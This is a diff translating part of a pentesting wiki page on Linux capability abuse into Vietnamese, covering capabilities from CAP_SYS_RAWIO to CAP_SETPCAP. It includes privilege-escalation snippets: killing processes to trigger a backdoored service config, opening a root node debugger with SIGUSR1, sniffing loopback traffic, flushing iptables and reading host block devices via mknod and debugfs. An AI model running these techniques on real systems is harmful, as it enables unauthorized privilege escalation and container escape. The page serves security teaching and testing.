+**Ví dụ với environment (Docker breakout)**
 
-Docker's documented default capability set includes **CAP_SETFCAP**, but the actual set depends on the runtime configuration.<sup>[[19]](#references)</sup>
-You can inspect the process capabilities with:
+Capability set mặc định được Docker ghi lại có **CAP_SETFCAP**, nhưng set thực tế phụ thuộc vào cấu hình runtime.<sup>[[19]](#references)</sup>
+Bạn có thể kiểm tra các capability của process bằng lệnh:
 
 ```bash
 cat /proc/`pidof bash`/status | grep Cap
@@ -1355,7 +1355,7 @@ capsh --decode=00000000a80425fb
 0x00000000a80425fb=cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap
 ```
 
-This capability allows writing file capabilities, but it does not by itself grant those capabilities to the current process or bypass the file, bounding-set, and namespace rules applied when the file is executed.<sup>[[14]](#references)</sup>
+Capability này cho phép ghi các capability của tệp, nhưng bản thân nó không cấp các capability đó cho tiến trình hiện tại hoặc vượt qua các quy tắc về tệp, bounding set và namespace được áp dụng khi tệp được thực thi.<sup>[[14]](#references)</sup>
 
 ```bash
 getcap /usr/bin/gdb
@@ -1367,15 +1367,15 @@ setcap cap_sys_admin,cap_sys_ptrace+eip /usr/bin/gdb
 bash: /usr/bin/gdb: Operation not permitted
 ```
 
-The file's permitted capabilities are limited by the process's capability bounding set, and the file effective bit controls whether the file's permitted set is raised into the process's effective set. This is why adding capabilities to a file does not automatically make every requested capability usable at execution time.<sup>[[14]](#references)</sup>
+Các capability được phép của tệp bị giới hạn bởi capability bounding set của tiến trình, còn bit effective của tệp quyết định liệu tập capability được phép của tệp có được đưa vào tập effective của tiến trình hay không. Vì vậy, việc thêm capability vào tệp không tự động khiến mọi capability được yêu cầu đều có thể sử dụng khi thực thi.<sup>[[14]](#references)</sup>
 
 ## CAP_SYS_RAWIO
 
-[**CAP_SYS_RAWIO**](https://man7.org/linux/man-pages/man7/capabilities.7.html) provides a number of sensitive operations including access to `/dev/mem`, `/dev/kmem` or `/proc/kcore`, modify `mmap_min_addr`, access `ioperm(2)` and `iopl(2)` system calls, and various disk commands. The `FIBMAP ioctl(2)` is also enabled via this capability, which has caused issues in the [past](http://lkml.iu.edu/hypermail/linux/kernel/9907.0/0132.html). As per the man page, this also allows the holder to perform a range of device-specific operations on other devices.<sup>[[14]](#references)</sup>
+[**CAP_SYS_RAWIO**](https://man7.org/linux/man-pages/man7/capabilities.7.html) cho phép thực hiện một số thao tác nhạy cảm, bao gồm truy cập `/dev/mem`, `/dev/kmem` hoặc `/proc/kcore`, sửa đổi `mmap_min_addr`, truy cập các system call `ioperm(2)` và `iopl(2)`, cũng như thực hiện nhiều lệnh đĩa. Capability này cũng cho phép dùng `FIBMAP ioctl(2)`, tính năng từng gây ra sự cố trong [past](http://lkml.iu.edu/hypermail/linux/kernel/9907.0/0132.html). Theo trang man, capability này còn cho phép chủ thể thực hiện nhiều thao tác dành riêng cho thiết bị trên các thiết bị khác.<sup>[[14]](#references)</sup>
 
-This can be useful for **privilege escalation** and **Docker breakout**.<sup>[[14]](#references)</sup>
+Capability này có thể hữu ích cho **privilege escalation** và **Docker breakout**.<sup>[[14]](#references)</sup>
 
-The capability alone does not expose a useful interface. A container breakout additionally needs an accessible host device or resource, device-cgroup and filesystem permission, and a hardware- and kernel-specific technique. Strict `/dev/mem`, kernel lockdown, virtualization, seccomp, and LSM policy commonly remove the generic paths. Validate the capability and exposure first:
+Chỉ riêng capability này không cung cấp một giao diện hữu ích. Để breakout khỏi container, còn cần có thiết bị hoặc tài nguyên trên host có thể truy cập, quyền của device-cgroup và filesystem, cùng một kỹ thuật phụ thuộc vào phần cứng và kernel. Các cơ chế như giới hạn nghiêm ngặt với `/dev/mem`, kernel lockdown, ảo hóa, seccomp và chính sách LSM thường vô hiệu hóa các đường khai thác tổng quát. Trước tiên, hãy xác minh capability và mức độ lộ diện:
 
 ```bash
 capsh --print | grep cap_sys_rawio
@@ -1383,7 +1383,7 @@ ls -l /dev/mem /dev/port 2>/dev/null
 find /sys/bus/pci/devices -maxdepth 2 -name 'resource*' -ls 2>/dev/null
 ```
 
-If `/dev/mem` is the approved interface, a disposable lab can demonstrate cross-boundary node-memory disclosure by reading and hashing a range selected from that lab's hardware map:
+Nếu `/dev/mem` là giao diện được phê duyệt, một lab tạm thời có thể minh họa việc tiết lộ bộ nhớ của node xuyên ranh giới bằng cách đọc và băm một vùng được chọn từ sơ đồ phần cứng của lab đó:
 
 ```bash
 approved_physical_address=<lab-provided-decimal-address>
@@ -1395,15 +1395,15 @@ sha256sum /tmp/ht-rawio-proof.bin
 rm /tmp/ht-rawio-proof.bin
 ```
 
-Do not guess the range: reading some MMIO regions can have side effects, and a valid address on one platform can control hardware or kernel memory on another. Kernel-memory modification or device control requires an approved, platform-specific proof; there is no safe universal raw-write example.
+Không đoán phạm vi: việc đọc một số vùng MMIO có thể gây tác dụng phụ, và một địa chỉ hợp lệ trên nền tảng này có thể điều khiển phần cứng hoặc bộ nhớ kernel trên nền tảng khác. Việc sửa đổi bộ nhớ kernel hoặc điều khiển thiết bị cần có bằng chứng được phê duyệt, dành riêng cho nền tảng; không có ví dụ ghi thô phổ quát nào là an toàn.
 
 ## CAP_KILL
 
-**This capability bypasses permission checks for sending signals to processes in the cases defined by the kernel**.<sup>[[14]](#references)</sup>
+**Capability này bỏ qua các bước kiểm tra quyền khi gửi tín hiệu đến tiến trình trong những trường hợp do kernel quy định**.<sup>[[14]](#references)</sup>
 
-**Example with binary**
+**Ví dụ với binary**
 
-Lets suppose the **`python`** binary has this capability. If you could **also modify some service or socket configuration** (or any configuration file related to a service) file, you could backdoor it, and then kill the process related to that service and wait for the new configuration file to be executed with your backdoor.
+Giả sử binary **`python`** có capability này. Nếu bạn **cũng có thể sửa đổi một số tệp cấu hình service hoặc socket** (hoặc bất kỳ tệp cấu hình nào liên quan đến một service), bạn có thể cài backdoor vào đó, sau đó kill tiến trình liên quan đến service ấy và chờ tệp cấu hình mới được thực thi cùng backdoor của bạn.
 
 ```python
 #Use this python code to kill arbitrary processes
@@ -1415,7 +1415,7 @@ os.killpg(pgid, signal.SIGKILL)
 
 **Privesc with kill**
 
-If you have kill capabilities and there is a **node program running as root** (or as a different user)you could probably **send** it the **signal SIGUSR1** and make it **open the node debugger** to where you can connect.
+Nếu bạn có kill capabilities và có một **node program đang chạy với quyền root** (hoặc bằng một user khác), có thể bạn sẽ **gửi** signal **SIGUSR1** cho nó để khiến nó **mở node debugger**, nơi bạn có thể kết nối.
 
 ```bash
 kill -s SIGUSR1 <nodejs-ps>
@@ -1430,11 +1430,11 @@ kill -s SIGUSR1 <nodejs-ps>
 
 ## CAP_NET_BIND_SERVICE
 
-**This capability permits binding to Internet ports below 1024.** It does not directly grant broader privilege escalation.<sup>[[14]](#references)</sup>
+**Capability này cho phép liên kết với các cổng Internet dưới 1024.** Bản thân nó không trực tiếp cấp thêm đặc quyền để leo thang.<sup>[[14]](#references)</sup>
 
-**Example with binary**
+**Ví dụ với binary**
 
-If **`python`** has this capability it will be able to listen on any port and even connect from it to any other port (some services require connections from specific privileges ports)
+Nếu **`python`** có capability này, nó có thể lắng nghe trên bất kỳ cổng nào và thậm chí kết nối từ cổng đó đến bất kỳ cổng nào khác (một số dịch vụ yêu cầu kết nối từ các cổng có đặc quyền cụ thể)
 
 {{#tabs}}
 {{#tab name="Listen"}}
@@ -1466,28 +1466,28 @@ s.connect(('10.10.10.10',500))
 
 ## CAP_NET_RAW
 
-[**CAP_NET_RAW**](https://man7.org/linux/man-pages/man7/capabilities.7.html) permits processes to **create RAW and PACKET sockets**, enabling them to generate and send arbitrary network packets. This can lead to security risks in containerized environments, such as packet spoofing, traffic injection, and bypassing network access controls. Malicious actors could exploit this to interfere with container routing or compromise host network security, especially without adequate firewall protections. Additionally, **CAP_NET_RAW** supports operations like ping via RAW ICMP requests.<sup>[[14]](#references)</sup>
+[**CAP_NET_RAW**](https://man7.org/linux/man-pages/man7/capabilities.7.html) cho phép các tiến trình **tạo socket RAW và PACKET**, nhờ đó chúng có thể tạo và gửi các gói mạng tùy ý. Điều này có thể dẫn đến rủi ro bảo mật trong môi trường container, chẳng hạn như giả mạo gói tin, chèn lưu lượng và vượt qua các biện pháp kiểm soát truy cập mạng. Các tác nhân độc hại có thể khai thác khả năng này để can thiệp vào việc định tuyến của container hoặc xâm phạm bảo mật mạng của host, đặc biệt khi không có biện pháp bảo vệ firewall phù hợp. Ngoài ra, **CAP_NET_RAW** hỗ trợ các thao tác như ping bằng yêu cầu ICMP RAW.<sup>[[14]](#references)</sup>
 
-**This can enable packet capture with a suitable socket interface.** It does not directly grant broader privilege escalation.<sup>[[14]](#references)</sup>
+**Khả năng này có thể cho phép bắt gói tin bằng giao diện socket phù hợp.** Bản thân nó không trực tiếp cấp thêm quyền rộng hơn để leo thang đặc quyền.<sup>[[14]](#references)</sup>
 
-For a credential-exposure path, also confirm that the current account can execute a capture tool with effective capabilities, that the relevant traffic crosses an interface visible in its network namespace, and that authentication material is sent in plaintext. For example, HTTP Basic credentials on unencrypted HTTP can be observed on loopback if the capture tool can access that interface. An account transition additionally requires the captured credential to work for another identity; a file capability or a visible login request alone does not establish password reuse.
+Để xác định khả năng làm lộ thông tin xác thực, hãy xác nhận thêm rằng tài khoản hiện tại có thể thực thi công cụ bắt gói với các capability hiệu lực, lưu lượng liên quan đi qua một giao diện có thể truy cập trong network namespace của nó, và thông tin xác thực được gửi dưới dạng plaintext. Ví dụ, thông tin xác thực HTTP Basic qua HTTP không mã hóa có thể bị quan sát trên loopback nếu công cụ bắt gói truy cập được giao diện đó. Việc chuyển sang tài khoản khác còn đòi hỏi thông tin xác thực thu được phải sử dụng được cho một danh tính khác; chỉ có file capability hoặc yêu cầu đăng nhập có thể quan sát được thì chưa đủ để khẳng định mật khẩu được dùng lại.
 
-On a wireless host, an executable WPS audit tool such as `reaver` with effective `CAP_NET_RAW`, plus an AP and monitor-mode interface visible through `iw dev`, is another review clue. It is **not** proof of a usable escalation: the AP must expose WPS PIN authentication without effective lockout, be reachable from the wireless interface, and disclose a PSK; host privilege changes only if that PSK is reused for an account. Passive enumeration should report interface modes and capabilities, not transmit probes or try PINs. See [CERT/CC VU#723755](https://www.kb.cert.org/vuls/id/723755) for the WPS PIN weakness and [Reaver's project documentation](https://github.com/shift/reaver-wps) for the tool's behavior.
+Trên host có kết nối không dây, một công cụ kiểm tra WPS dạng executable như `reaver` với `CAP_NET_RAW` hiệu lực, cùng với AP và giao diện monitor mode có thể xem được qua `iw dev`, là một dấu hiệu khác cần xem xét. Đây **không** phải bằng chứng cho thấy có thể leo thang đặc quyền: AP phải hỗ trợ xác thực WPS PIN mà không có cơ chế khóa hiệu quả, có thể truy cập từ giao diện không dây và tiết lộ PSK; quyền trên host chỉ thay đổi nếu PSK đó được dùng lại cho một tài khoản. Việc liệt kê thụ động chỉ nên báo cáo các mode và capability của giao diện, không gửi probe hoặc thử PIN. Xem [CERT/CC VU#723755](https://www.kb.cert.org/vuls/id/723755) về điểm yếu của WPS PIN và [tài liệu dự án Reaver](https://github.com/shift/reaver-wps) về cách hoạt động của công cụ.
 
-**Example with binary**
+**Ví dụ với binary**
 
-If the binary **`tcpdump`** has this capability you will be able to use it to capture network information.
+Nếu binary **`tcpdump`** có capability này, bạn sẽ có thể dùng nó để bắt thông tin mạng.
 
 ```bash
 getcap -r / 2>/dev/null
 /usr/sbin/tcpdump = cap_net_raw+ep
 ```
 
-If the **environment** grants this capability, **`tcpdump`** can also use it to sniff traffic.<sup>[[14]](#references)</sup>
+Nếu **environment** cấp capability này, **`tcpdump`** cũng có thể dùng nó để sniff traffic.<sup>[[14]](#references)</sup>
 
-**Example with binary 2**
+**Ví dụ với binary 2**
 
-The following example is **`python2`** code that can be useful to intercept traffic of the "**lo**" (**localhost**) interface. The code is from the lab "_The Basics: CAP-NET_BIND + NET_RAW_" from [https://attackdefense.pentesteracademy.com/](https://attackdefense.pentesteracademy.com).<sup>[[1]](#references)</sup>
+Ví dụ sau là code **`python2`** có thể hữu ích để chặn traffic trên interface "**lo**" (**localhost**). Code này thuộc lab "_The Basics: CAP-NET_BIND + NET_RAW_" tại [https://attackdefense.pentesteracademy.com/](https://attackdefense.pentesteracademy.com).<sup>[[1]](#references)</sup>
 
 ```python
 import socket
@@ -1535,13 +1535,13 @@ while True:
 
 ## CAP_NET_ADMIN + CAP_NET_RAW
 
-[**CAP_NET_ADMIN**](https://man7.org/linux/man-pages/man7/capabilities.7.html) grants the holder the power to **alter network configurations**, including firewall settings, routing tables, socket permissions, and network interface settings in the current network namespace. It can also enable promiscuous mode on an interface in that namespace; this may expose traffic delivered to that interface, but it does not by itself permit sniffing arbitrary interfaces in other network namespaces.<sup>[[14]](#references)</sup>
+[**CAP_NET_ADMIN**](https://man7.org/linux/man-pages/man7/capabilities.7.html) cấp cho người sở hữu quyền **thay đổi cấu hình mạng**, bao gồm cài đặt firewall, bảng định tuyến, quyền socket và cài đặt giao diện mạng trong network namespace hiện tại. Nó cũng có thể bật chế độ promiscuous trên một giao diện trong namespace đó; việc này có thể khiến giao diện nhận được lưu lượng mạng được gửi đến nó, nhưng tự nó không cho phép sniff các giao diện tùy ý trong những network namespace khác.<sup>[[14]](#references)</sup>
 
-These operations affect the process's **current network namespace**. Host network-state control requires `--network=host`, Kubernetes `hostNetwork: true`, or a separate namespace-entry primitive. `CAP_NET_RAW` alone is not a generic host shell, but it has participated in a documented, protocol-specific escape: a historical GCE chain combined root, the host network namespace, `CAP_NET_ADMIN`, `CAP_NET_RAW`, plaintext metadata traffic, and a raceable guest-agent request to inject an SSH key. See [GCP - Network Docker Escape](https://cloud.hacktricks.wiki/en/pentesting-cloud/gcp-security/gcp-privilege-escalation/gcp-network-docker-escape.html) for the full prerequisites and modern HTTPS metadata caveats.
+Các thao tác này ảnh hưởng đến **network namespace hiện tại** của tiến trình. Để kiểm soát trạng thái mạng của host, cần có `--network=host`, Kubernetes `hostNetwork: true` hoặc một primitive riêng để vào namespace. Chỉ riêng `CAP_NET_RAW` không phải là một shell host đa năng, nhưng nó từng tham gia vào một escape đã được ghi nhận, chỉ áp dụng cho giao thức cụ thể: một chain GCE trước đây kết hợp root, host network namespace, `CAP_NET_ADMIN`, `CAP_NET_RAW`, lưu lượng metadata dạng plaintext và một yêu cầu đến guest agent có thể bị race để inject SSH key. Xem [GCP - Network Docker Escape](https://cloud.hacktricks.wiki/en/pentesting-cloud/gcp-security/gcp-privilege-escalation/gcp-network-docker-escape.html) để biết đầy đủ các điều kiện tiên quyết và lưu ý hiện đại về metadata qua HTTPS.
 
-**Example with binary**
+**Ví dụ với binary**
 
-Lets suppose that the **python binary** has these capabilities.
+Giả sử **python binary** có các capabilities sau.
 
 ```python
 #Dump iptables filter table rules
@@ -1557,11 +1557,11 @@ iptc.easy.flush_table('filter')
 
 ## CAP_LINUX_IMMUTABLE
 
-**This capability permits modifying inode flags such as immutable and append-only.** It does not directly grant broader privilege escalation.<sup>[[14]](#references)</sup>
+**Capability này cho phép sửa đổi các cờ inode như immutable và append-only.** Nó không trực tiếp cấp quyền leo thang đặc quyền rộng hơn.<sup>[[14]](#references)</sup>
 
-**Example with binary**
+**Ví dụ với binary**
 
-If you find that a file is immutable and python has this capability, you can **remove the immutable attribute and make the file modifiable:**
+Nếu phát hiện một file là immutable và python có capability này, bạn có thể **gỡ thuộc tính immutable để file có thể chỉnh sửa:**
 
 ```python
 #Check that the file is imutable
@@ -1588,10 +1588,10 @@ with open('/path/to/file.sh', 'a') as f:
     f.write('New content for the file\n')
 ```
 
-The `FS_IOC_GETFLAGS` and `FS_IOC_SETFLAGS` operations read and update inode flags; `FS_IMMUTABLE_FL` is the immutable flag cleared by this example.<sup>[[27]](#references)</sup>
+Các thao tác `FS_IOC_GETFLAGS` và `FS_IOC_SETFLAGS` đọc và cập nhật các cờ inode; `FS_IMMUTABLE_FL` là cờ bất biến được ví dụ này xóa.<sup>[[27]](#references)</sup>
 
 > [!TIP]
-> Note that usually this immutable attribute is set and remove using:
+> Lưu ý rằng thuộc tính bất biến này thường được thiết lập và gỡ bỏ bằng cách sử dụng:
 >
 > ```bash
 > sudo chattr +i file.txt
@@ -1600,18 +1600,18 @@ The `FS_IOC_GETFLAGS` and `FS_IOC_SETFLAGS` operations read and update inode fla
 
 ## CAP_SYS_CHROOT
 
-[**CAP_SYS_CHROOT**](https://man7.org/linux/man-pages/man7/capabilities.7.html) enables the execution of the `chroot(2)` system call, which can allow escape from a weakly constructed `chroot(2)` jail through known techniques.<sup>[[11]](#references)[[14]](#references)</sup>
+[**CAP_SYS_CHROOT**](https://man7.org/linux/man-pages/man7/capabilities.7.html) cho phép thực thi system call `chroot(2)`, qua đó có thể thoát khỏi một jail `chroot(2)` được thiết lập yếu bằng các kỹ thuật đã biết.<sup>[[11]](#references)[[14]](#references)</sup>
 
-This is a **chroot-jail escape capability, not a standalone container-to-host escape**. It neither exposes the host filesystem nor bypasses its permissions. If a host root is already mounted or reachable through `/proc/<pid>/root`, `chroot()` only makes that existing tree the process's pathname root. Separately, changing mount namespaces with `setns(2)` requires both `CAP_SYS_CHROOT` and `CAP_SYS_ADMIN` in the caller's user namespace, plus `CAP_SYS_ADMIN` in the user namespace that owns the target mount namespace.<sup>[[14]](#references)</sup>
+Đây là **capability thoát khỏi chroot-jail, không phải khả năng tự nó thoát từ container ra host**. Nó không làm lộ filesystem của host hay vượt qua các quyền truy cập. Nếu root của host đã được mount hoặc có thể truy cập qua `/proc/<pid>/root`, `chroot()` chỉ đặt cây hiện có đó làm root đường dẫn của tiến trình. Riêng việc thay đổi mount namespace bằng `setns(2)` đòi hỏi caller có cả `CAP_SYS_CHROOT` và `CAP_SYS_ADMIN` trong user namespace của mình, đồng thời có `CAP_SYS_ADMIN` trong user namespace sở hữu mount namespace đích.<sup>[[14]](#references)</sup>
 
 - [How to break out from various chroot solutions](https://deepsec.net/docs/Slides/2015/Chw00t_How_To_Break%20Out_from_Various_Chroot_Solutions_-_Bucsay_Balazs.pdf).<sup>[[11]](#references)</sup>
 - [chw00t: chroot escape tool](https://github.com/earthquake/chw00t/)
 
 ## CAP_SYS_BOOT
 
-[**CAP_SYS_BOOT**](https://man7.org/linux/man-pages/man7/capabilities.7.html) allows the execution of the `reboot(2)` system call for system restarts, including commands such as `LINUX_REBOOT_CMD_RESTART2`; it also enables `kexec_load(2)` and, from Linux 3.17 onwards, `kexec_file_load(2)` for loading new or signed crash kernels respectively.<sup>[[14]](#references)</sup>
+[**CAP_SYS_BOOT**](https://man7.org/linux/man-pages/man7/capabilities.7.html) cho phép thực thi system call `reboot(2)` để khởi động lại hệ thống, bao gồm các lệnh như `LINUX_REBOOT_CMD_RESTART2`; capability này cũng cho phép dùng `kexec_load(2)` và, từ Linux 3.17 trở đi, `kexec_file_load(2)` để tải lần lượt các crash kernel mới hoặc đã ký.<sup>[[14]](#references)</sup>
 
-Inside a private PID namespace, a supported `reboot()` request terminates that namespace's init process instead of rebooting the host. Host reboot impact therefore requires the initial PID namespace, normally through host PID sharing. A kexec-based takeover additionally requires a compatible image, an available syscall, and permissive lockdown and signature policy. Do not trigger either operation on a shared host merely to validate the capability:
+Trong một PID namespace riêng, yêu cầu `reboot()` được hỗ trợ sẽ chấm dứt tiến trình init của namespace đó thay vì khởi động lại host. Vì vậy, để tác động đến việc khởi động lại host, cần ở trong PID namespace ban đầu, thường thông qua việc chia sẻ PID với host. Chiếm quyền bằng kexec còn đòi hỏi image tương thích, syscall khả dụng và chính sách lockdown cũng như chữ ký cho phép. Không kích hoạt một trong hai thao tác này trên host dùng chung chỉ để xác minh capability:
 
 ```bash
 capsh --print | grep cap_sys_boot
@@ -1622,30 +1622,30 @@ cat /sys/kernel/security/lockdown 2>/dev/null
 
 ## CAP_SYSLOG
 
-[**CAP_SYSLOG**](https://man7.org/linux/man-pages/man7/capabilities.7.html) was separated from the broader **CAP_SYS_ADMIN** in Linux 2.6.37, specifically granting the ability to use the `syslog(2)` call. This capability enables the viewing of kernel addresses via `/proc` and similar interfaces when the `kptr_restrict` setting is at 1, which controls the exposure of kernel addresses. Since Linux 2.6.39, the default for `kptr_restrict` is 0, meaning kernel addresses are exposed, though many distributions set this to 1 (hide addresses except from uid 0) or 2 (always hide addresses) for security reasons.<sup>[[14]](#references)</sup>
+[**CAP_SYSLOG**](https://man7.org/linux/man-pages/man7/capabilities.7.html) được tách khỏi **CAP_SYS_ADMIN** rộng hơn trong Linux 2.6.37, cụ thể là cấp quyền sử dụng lệnh gọi `syslog(2)`. Capability này cho phép xem địa chỉ kernel qua `/proc` và các giao diện tương tự khi cài đặt `kptr_restrict` là 1; cài đặt này kiểm soát việc để lộ địa chỉ kernel. Kể từ Linux 2.6.39, giá trị mặc định của `kptr_restrict` là 0, nghĩa là địa chỉ kernel được để lộ, dù nhiều bản phân phối đặt giá trị này thành 1 (ẩn địa chỉ, trừ với uid 0) hoặc 2 (luôn ẩn địa chỉ) vì lý do bảo mật.<sup>[[14]](#references)</sup>
 
-Additionally, **CAP_SYSLOG** allows accessing `dmesg` output when `dmesg_restrict` is set to 1. Despite these changes, **CAP_SYS_ADMIN** retains the ability to perform `syslog` operations due to historical precedents.<sup>[[14]](#references)</sup>
+Ngoài ra, **CAP_SYSLOG** cho phép truy cập đầu ra `dmesg` khi `dmesg_restrict` được đặt thành 1. Dù có những thay đổi này, **CAP_SYS_ADMIN** vẫn có thể thực hiện các thao tác `syslog` do tiền lệ lịch sử.<sup>[[14]](#references)</sup>
 
 ## CAP_MKNOD
 
-[**CAP_MKNOD**](https://man7.org/linux/man-pages/man7/capabilities.7.html) extends the functionality of the `mknod` system call beyond creating regular files, FIFOs (named pipes), or UNIX domain sockets. It specifically allows for the creation of special files, which include:<sup>[[14]](#references)</sup>
+[**CAP_MKNOD**](https://man7.org/linux/man-pages/man7/capabilities.7.html) mở rộng chức năng của lời gọi hệ thống `mknod`, cho phép tạo nhiều loại đối tượng hơn ngoài tệp thông thường, FIFO (named pipe) hoặc UNIX domain socket. Cụ thể, capability này cho phép tạo các tệp đặc biệt, bao gồm:<sup>[[14]](#references)</sup>
 
-- **S_IFCHR**: Character special files, which are devices like terminals.
-- **S_IFBLK**: Block special files, which are devices like disks.
+- **S_IFCHR**: Tệp đặc biệt kiểu ký tự, chẳng hạn như thiết bị đầu cuối.
+- **S_IFBLK**: Tệp đặc biệt kiểu khối, chẳng hạn như đĩa.
 
-This capability is useful for processes that need to create device files, including character or block devices.<sup>[[14]](#references)</sup>
+Capability này hữu ích cho các tiến trình cần tạo tệp thiết bị, bao gồm thiết bị kiểu ký tự hoặc kiểu khối.<sup>[[14]](#references)</sup>
 
-It is included in Docker's documented default capability set; verify the actual runtime configuration rather than assuming every deployment uses the same defaults ([Moby default capability list](https://github.com/moby/moby/blob/master/oci/caps/defaults.go#L6-L19)).<sup>[[19]](#references)</sup>
+Capability này có trong bộ capability mặc định được Docker công bố; hãy xác minh cấu hình runtime thực tế thay vì cho rằng mọi triển khai đều dùng cùng giá trị mặc định ([Moby default capability list](https://github.com/moby/moby/blob/master/oci/caps/defaults.go#L6-L19)).<sup>[[19]](#references)</sup>
 
-For a container escape, `CAP_MKNOD` can create a missing handle to a real host device, but it does **not** create the underlying device and does **not** bypass the device cgroup. The complete chain requires:
+Để thoát container, `CAP_MKNOD` có thể tạo một handle còn thiếu trỏ đến thiết bị thật trên host, nhưng **không** tạo ra thiết bị nền và **không** vượt qua device cgroup. Chuỗi điều kiện hoàn chỉnh cần có:
 
-1. Effective `CAP_MKNOD` in the initial user namespace, because device creation is not namespaced.
-2. The correct block or character type and major/minor numbers for a real host device.
-3. Device-cgroup permission to open that device.
-4. A compatible filesystem-aware reader, or `CAP_SYS_ADMIN` to mount a block filesystem.
-5. Filesystem and LSM permission to create and use the node.
+1. `CAP_MKNOD` hiệu lực trong initial user namespace, vì việc tạo thiết bị không được namespace hóa.
+2. Loại block hoặc character cùng số major/minor chính xác của một thiết bị thật trên host.
+3. Quyền của device cgroup cho phép mở thiết bị đó.
+4. Một trình đọc tương thích với filesystem, hoặc `CAP_SYS_ADMIN` để mount filesystem dạng block.
+5. Quyền của filesystem và LSM cho phép tạo và sử dụng node.
 
-For an ext-family lab block device whose real major/minor numbers are `252:1`, a read-only validation is:
+Đối với thiết bị block trong môi trường lab dùng filesystem họ ext, có số major/minor thực là `252:1`, có thể xác minh chỉ đọc như sau:
 
 ```bash
 mknod /dev/ht-node-root b 252 1
@@ -1654,11 +1654,11 @@ debugfs -R 'cat /etc/hostname' /dev/ht-node-root
 rm /dev/ht-node-root
 ```
 
-Replace the numbers with those reported by `/sys/class/block/<device>/dev`. If creating the node succeeds but opening it returns `Operation not permitted`, the device cgroup is still blocking access. This is the normal result in a container that merely has Docker's default `CAP_MKNOD` without an explicit device allowance.
+Thay các số bằng giá trị được báo cáo trong `/sys/class/block/<device>/dev`. Nếu tạo node thành công nhưng mở node trả về `Operation not permitted`, device cgroup vẫn đang chặn quyền truy cập. Đây là kết quả bình thường trong container chỉ có `CAP_MKNOD` mặc định của Docker mà không được cấp quyền truy cập thiết bị cụ thể.
 
-There is also a distinct **two-foothold local privilege-escalation** technique that must not be confused with direct container device access. A root process in a container that shares the initial user namespace can create a block-device node, while an unprivileged shell on the host with a matching UID opens that node through `/proc/<container-pid>/root`. The open is then evaluated in the host shell's cgroup, so the container's device-cgroup denial no longer protects the device.<sup>[[7]](#references)</sup>
+Ngoài ra còn có một kỹ thuật **two-foothold local privilege-escalation** riêng biệt, không được nhầm lẫn với việc truy cập thiết bị container trực tiếp. Một tiến trình root trong container dùng chung initial user namespace có thể tạo node thiết bị khối, trong khi một shell không đặc quyền trên host có UID trùng khớp mở node đó thông qua `/proc/<container-pid>/root`. Khi đó, thao tác mở được đánh giá theo cgroup của shell trên host, nên cơ chế từ chối của device cgroup trong container không còn bảo vệ thiết bị nữa.<sup>[[7]](#references)</sup>
 
-Inside the container, create the node and keep a process running as the UID of the existing host foothold:
+Bên trong container, hãy tạo node và giữ một tiến trình chạy với UID của foothold hiện có trên host:
 
 ```bash
 host_uid=1000 # Replace with the UID of the existing unprivileged host shell.
@@ -1673,7 +1673,7 @@ fi
 su -s /bin/sh "$bridge_user" -c 'sleep 600'
 ```
 
-From the existing host shell with that UID, identify the host PID of the sleeping container process and use its procfs root as the path to the device:
+Từ shell trên host hiện có với UID đó, xác định PID trên host của tiến trình container đang ngủ và dùng thư mục gốc procfs của tiến trình đó làm đường dẫn đến thiết bị:
 
 ```bash
 container_pid=<host-pid-of-the-matching-uid-process>
@@ -1681,42 +1681,41 @@ stat "/proc/${container_pid}/root/dev/ht-node-root"
 debugfs -R 'cat /etc/hostname' "/proc/${container_pid}/root/dev/ht-node-root"
 ```
 
-This chain requires both footholds, an identity-mapped or shared user namespace, permission to traverse the target `/proc/<pid>/root`, a real device with correct major/minor numbers, and an outer cgroup that permits the open. `hidepid`, ptrace-access rules, an LSM, filesystem incompatibility, or user-namespace remapping can break it. The historical technique is valuable precisely because it explains how `/proc/<pid>/root` can bypass the *container's* device-cgroup restriction; it is not a claim that `CAP_MKNOD` alone escapes a normally isolated container.<sup>[[7]](#references)</sup>
+Chuỗi này yêu cầu phải có cả hai foothold, user namespace được ánh xạ danh tính hoặc dùng chung, quyền truy cập qua `/proc/<pid>/root` mục tiêu, một thiết bị thực có số major/minor chính xác và cgroup bên ngoài cho phép mở thiết bị. `hidepid`, quy tắc kiểm soát quyền truy cập ptrace, LSM, hệ thống tệp không tương thích hoặc ánh xạ lại user namespace đều có thể làm chuỗi này thất bại. Kỹ thuật lịch sử này có giá trị chính xác vì giải thích cách `/proc/<pid>/root` có thể vượt qua hạn chế của device cgroup *trong container*; điều đó không có nghĩa là chỉ riêng `CAP_MKNOD` có thể thoát khỏi một container được cô lập bình thường.<sup>[[7]](#references)</sup>
 
 ### CAP_SETPCAP
 
-On current Linux kernels with file capabilities, **`CAP_SETPCAP`** lets a thread add capabilities from its bounding set to its inheritable set, drop capabilities from its bounding set, and change its securebits. It does not let a process arbitrarily grant capabilities to another process; that behavior applies only to pre-2.6.25 kernels without file-capability support.<sup>[[14]](#references)</sup>
+Trên các kernel Linux hiện tại có file capabilities, **`CAP_SETPCAP`** cho phép một thread thêm các capability từ bounding set vào inheritable set, loại bỏ capability khỏi bounding set và thay đổi securebits của nó. Nó không cho phép một tiến trình tùy ý cấp capability cho tiến trình khác; hành vi đó chỉ áp dụng cho các kernel trước 2.6.25 không hỗ trợ file capabilities.<sup>[[14]](#references)</sup>
 
-The `capset()` system call can adjust a thread's own effective, permitted, and inheritable sets, but the new permitted set cannot contain capabilities outside the existing permitted set and inheritable updates remain subject to kernel constraints.<sup>[[14]](#references)</sup>
+Lệnh gọi hệ thống `capset()` có thể điều chỉnh các set effective, permitted và inheritable của chính thread đó, nhưng permitted set mới không thể chứa capability nằm ngoài permitted set hiện có, còn các cập nhật inheritable vẫn phải tuân theo những ràng buộc của kernel.<sup>[[14]](#references)</sup>
 
 ## References
 
-- [1] [AttackDefense (Pentester Academy) - Linux capabilities privilege escalation labs](https://attackdefense.pentesteracademy.com)
-- [2] [Hacker's Grimoire - Privilege Escalation Linux](https://vulp3cula.gitbook.io/hackers-grimoire/post-exploitation/privesc-linux)
-- [3] [Linux Container Basics: Capabilities](https://www.schutzwerk.com/en/43/posts/linux_container_capabilities/)
+- [1] [AttackDefense (Pentester Academy) - Các bài thực hành leo thang đặc quyền bằng Linux capabilities](https://attackdefense.pentesteracademy.com)
